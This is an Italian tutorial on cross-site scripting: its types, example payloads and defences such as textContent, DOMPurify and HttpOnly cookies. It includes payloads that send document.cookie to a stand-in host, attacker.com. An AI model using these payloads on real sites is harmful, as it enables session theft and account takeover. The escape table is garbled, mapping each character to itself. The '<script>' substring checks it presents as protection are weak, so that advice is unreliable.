# Cross-Site Scripting (XSS)

## Teoria completa e spiegazione

---

# Cos’è XSS?

Cross-Site Scripting (XSS) è una vulnerabilità di sicurezza web che permette a un attaccante di inserire codice HTML o JavaScript malevolo all’interno di una pagina web.

Questo succede quando un’applicazione prende input forniti dagli utenti (commenti, parametri URL, campi profilo, form, messaggi, ecc.) e li inserisce nella pagina HTML senza controlli adeguati.

Il browser non riesce più a distinguere tra:

* dati normali
* codice eseguibile

Di conseguenza, il browser esegue il codice dell’attaccante come se fosse parte legittima del sito.

---

# Perché XSS è importante?

XSS è una delle vulnerabilità più diffuse e pericolose nel web moderno ed è presente nella OWASP Top 10.

Con JavaScript eseguito nel browser della vittima, un attaccante può:

* rubare cookie di sessione
* prendere controllo degli account
* impersonare utenti
* creare form di login falsi (phishing)
* modificare il contenuto della pagina
* eseguire richieste a nome della vittima
* leggere dati sensibili
* installare malware lato browser

In pratica, il browser della vittima esegue codice malevolo credendo che provenga dal sito affidabile.

---

# Il problema fondamentale

Il problema nasce quando il browser interpreta input utente come HTML reale.

Se un’applicazione inserisce dati utente direttamente dentro il DOM usando strumenti pericolosi come:

```js
innerHTML
```

allora il browser pensa:

> “Questo è HTML valido da eseguire.”

Quindi:

* tag HTML vengono interpretati
* script JavaScript vengono eseguiti
* eventi HTML vengono attivati

---

# Esempio base di XSS

Un normale utente potrebbe scrivere:

```html
Ciao a tutti!
```

Ma un attaccante potrebbe inserire:

```html
<script>alert('Hacked')</script>
```

Se il sito inserisce quel contenuto direttamente nell’HTML della pagina:

```js
el.innerHTML = userInput;
```

allora il browser eseguirà lo script.

---

# Esempio classico: img onerror

Uno dei payload più famosi:

```html
<img src="x" onerror="alert('You have been hacked!')" />
```

## Come funziona?

1. Il browser prova a caricare l’immagine `src="x"`
2. L’immagine non esiste
3. Si attiva l’evento `onerror`
4. Il browser esegue il JavaScript contenuto nell’attributo

Quindi compare l’alert.

---

# Esempio realistico tramite URL

```txt
/search?q=<img src=x onerror="fetch('https://attacker.com/c='+document.cookie)">
```

Se il parametro `q` viene mostrato nella pagina senza protezioni:

```js
results.innerHTML = q;
```

allora:

* il browser esegue lo script
* `document.cookie` legge i cookie della vittima
* i cookie vengono inviati al server dell’attaccante

Questo può portare al furto della sessione.

---

# Cosa può fare un attaccante con XSS?

## Furto di cookie

```js
fetch("https://attacker.com?c=" + document.cookie)
```

L’attaccante riceve il cookie di sessione.

---

## Account takeover

Se il cookie rappresenta la sessione autenticata:

* l’attaccante può impersonare l’utente
* accedere all’account
* compiere azioni a suo nome

---

## Phishing

L’attaccante può modificare il DOM:

```html
<form>
  <input placeholder="Password" />
</form>
```

facendo apparire una falsa schermata di login.

---

## Azioni a nome della vittima

JavaScript può inviare richieste HTTP usando:

```js
fetch()
```

oppure:

```js
XMLHttpRequest
```

quindi può:

* cambiare password
* fare acquisti
* inviare messaggi
* cancellare dati

usando la sessione della vittima.

---

# Tipi di XSS

---

# 1. Stored XSS

Il payload malevolo viene salvato nel database.

Esempi:

* commenti
* post
* chat
* profili utente

Ogni visitatore della pagina eseguirà automaticamente lo script.

## Esempio

Un attaccante pubblica:

```html
<script>stealCookies()</script>
```

nel sistema commenti.

Il server salva il commento.

Ogni utente che apre la pagina esegue lo script.

---

# 2. Reflected XSS

Il payload arriva tramite URL o richiesta HTTP.

Esempio:

```txt
/search?q=<script>alert(1)</script>
```

Il server riflette il parametro nella risposta HTML.

Il payload non viene salvato nel database.

---

# 3. DOM-Based XSS

La vulnerabilità nasce direttamente nel frontend JavaScript.

Esempio:

```js
element.innerHTML = location.hash;
```

Se l’URL contiene:

```txt
#<img src=x onerror=alert(1)>
```

allora il browser esegue il payload.

---

# La difesa principale: Output Escaping

La regola fondamentale:

> Mai inserire input utente direttamente come HTML.

Bisogna trasformare caratteri speciali:

| Carattere | Escape |
| --------- | ------ |
| <         | <      |
| >         | >      |
| &         | &      |
| "         | "      |

Così il browser li mostrerà come testo e NON come codice.

---

# textContent vs innerHTML

## Metodo sicuro

```js
el.textContent = userInput;
```

Il browser mostra il testo letteralmente.

Se l’utente scrive:

```html
<script>alert(1)</script>
```

verrà mostrato come testo.

Nessun codice verrà eseguito.

---

# Metodo pericoloso

```js
el.innerHTML = userInput;
```

Qui invece il browser interpreta il contenuto come HTML reale.

Questo apre la porta a:

* script
* eventi HTML
* payload XSS

---

# Framework moderni e XSS

Molti framework moderni eseguono escaping automatico.

---

# React

## Sicuro

```jsx
<h1>{name}</h1>
```

React esegue escaping automatico.

---

## Pericoloso

```jsx
<div dangerouslySetInnerHTML={{ __html: name }} />
```

Qui React riceve istruzioni per inserire HTML reale.

Se `name` contiene codice malevolo, si può avere XSS.

---

# Vue

## Sicuro

```vue
{{ value }}
```

---

## Pericoloso

```vue
v-html
```

---

# Plain JavaScript

| Sicuro      | Pericoloso |
| ----------- | ---------- |
| textContent | innerHTML  |

---

# Quando HTML deve essere permesso

A volte l’applicazione deve accettare HTML.

Esempi:

* editor WYSIWYG
* blog
* markdown avanzato
* contenuti formattati

In questi casi NON bisogna usare regex fatte a mano.

Serve una sanitizzazione seria.

---

# DOMPurify

La libreria più famosa per sanitizzare HTML è:

DOMPurify

Esempio:

```js
el.innerHTML = DOMPurify.sanitize(userHtml);
```

DOMPurify rimuove:

* `<script>`
* `onerror`
* `onclick`
* attributi pericolosi
* payload XSS
* codice JavaScript nascosto

---

# Perché le regex non bastano?

Gli attaccanti possono usare:

* encoding
* payload spezzati
* SVG
* MathML
* attributi strani
* bypass HTML parser

Creare un sanitizer corretto è estremamente difficile.

Per questo si usano librerie mature come DOMPurify.

---

# Sicurezza dei cookie

## Cookie normali

JavaScript può leggere:

```js
document.cookie
```

Quindi un payload XSS può rubare la sessione.

---

# HttpOnly

Cookie sicuro:

```http
Set-Cookie: session=...; HttpOnly
```

Con `HttpOnly`:

* JavaScript NON può leggere il cookie
* `document.cookie` non mostra il cookie di sessione

Questo blocca il classico furto cookie tramite XSS.

---

# Secure

```http
Secure
```

Il cookie viene inviato solo tramite HTTPS.

---

# SameSite=Strict

```http
SameSite=Strict
```

Riduce il rischio di CSRF.

---

# Difese implementate nella demo

Nella demo della lezione sono state implementate varie protezioni.

---

# 1. Uso di textContent

Invece di:

```js
innerHTML
```

è stato usato:

```js
textContent
```

per evitare l’esecuzione di HTML malevolo.

---

# 2. Validazione input nel backend

Il backend controlla i dati ricevuti prima di salvarli.

Esempio:

```js
if(body.includes("<script>")) {
   reject();
}
```

Questo impedisce che payload pericolosi finiscano nel database.

---

# 3. Validazione tramite Sequelize

Sequelize è un ORM per Node.js.

Può validare automaticamente i dati prima delle query SQL.

Quindi:

* dati invalidi vengono rifiutati
* il database riceve solo dati controllati

---

# 4. CHECK Constraints nel database

Anche il database può applicare regole di sicurezza.

Esempio:

```sql
CHECK(body NOT LIKE '%<script>%')
```

Questo protegge i dati anche se:

* il backend fallisce
* altre applicazioni scrivono nel database
* esistono bug nel codice

---

# Defense in Depth

La sicurezza moderna usa il principio:

> Non fidarsi mai di una sola protezione.

Bisogna proteggere più livelli contemporaneamente:

* frontend
* backend
* database
* cookie
* browser policy
* sanitizzazione

Anche se una protezione fallisce, le altre possono fermare l’attacco.

---

# Regola fondamentale

> Non inserire mai input utente come HTML nella pagina.

Usare sempre:

* `textContent`
* escaping automatico
* sanitizzazione sicura

---

# Tabella riassuntiva

| Sicuro             | Pericoloso              |
| ------------------ | ----------------------- |
| textContent        | innerHTML               |
| {value} in React   | dangerouslySetInnerHTML |
| {{ value }} in Vue | v-html                  |
| DOMPurify          | regex fatte a mano      |

---

# Concetti chiave da ricordare

* XSS permette esecuzione di JavaScript nel browser della vittima
* Il problema nasce da input utente non filtrato
* innerHTML è pericoloso
* textContent è sicuro
* I framework moderni fanno escaping automatico
* Se serve HTML bisogna sanitizzare
* DOMPurify è una soluzione standard
* HttpOnly protegge i cookie
* La sicurezza deve essere multilivello

---

# Risorse utili

## OWASP XSS Overview

[https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

---

## OWASP XSS Prevention Cheat Sheet

[https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

## DOMPurify

[https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
